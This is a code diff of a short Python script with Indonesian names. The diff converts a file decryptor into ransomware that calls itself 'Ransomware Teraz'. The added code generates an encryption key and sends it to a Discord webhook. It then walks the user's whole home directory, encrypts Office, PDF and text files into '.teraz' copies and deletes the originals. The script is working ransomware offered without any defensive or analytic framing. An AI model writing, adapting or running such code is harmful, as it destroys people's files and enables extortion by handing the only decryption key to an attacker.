@@ -1,19 +1,38 @@
 import os
 from cryptography.fernet import Fernet
+import requests
 
-def dekripsi_file(file_path, key):
+WEBHOOK_URL = "webhook_url_discord"
+
+USER_DIR = os.path.join(os.environ.get('USERPROFILE', os.environ.get('HOME', '/')))
+
+def enkripsi_file(file_path, key):
     f = Fernet(key)
     with open(file_path, 'rb') as file:
         file_data = file.read()
-    decrypted_data = f.decrypt(file_data)
-    with open(file_path.replace('.teraz', ''), 'wb') as file:
-        file.write(decrypted_data)
+    encrypted_data = f.encrypt(file_data)
+    with open(file_path + '.teraz', 'wb') as file:
+        file.write(encrypted_data)
     os.remove(file_path)
 
-DESKTOP_DIR = os.path.join(os.environ.get('USERPROFILE', os.environ.get('HOME', '/')), 'Desktop')
+def kirim_kunci_ke_webhook(key):
+    try:
+        payload = {
+            "content": f"KEY: {key.decode()}",
+            "username": "Ransomware Teraz"
+        }
+        response = requests.post(WEBHOOK_URL, json=payload)
+        if response.status_code != 204:
+            print(f"Failed to send key: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending key to webhook: {e}")
 
-key = b'KEY_FROM_WEBHOOK'  
+key = Fernet.generate_key()
 
-for file in os.listdir(DESKTOP_DIR):
-    if file.endswith(".teraz"):
-        dekripsi_file(os.path.join(DESKTOP_DIR, file), key)
+kirim_kunci_ke_webhook(key)
+
+ekstensi_tertentu = ['.txt', '.docx', '.docm', '.dotx', '.dotm', '.xlsx', '.pptx', '.pdf', '.doc', '.xls']
+for root, dirs, files in os.walk(USER_DIR):
+    for file in files:
+        if any(file.endswith(ekstensi) for ekstensi in ekstensi_tertentu):
+            enkripsi_file(os.path.join(root, file), key)
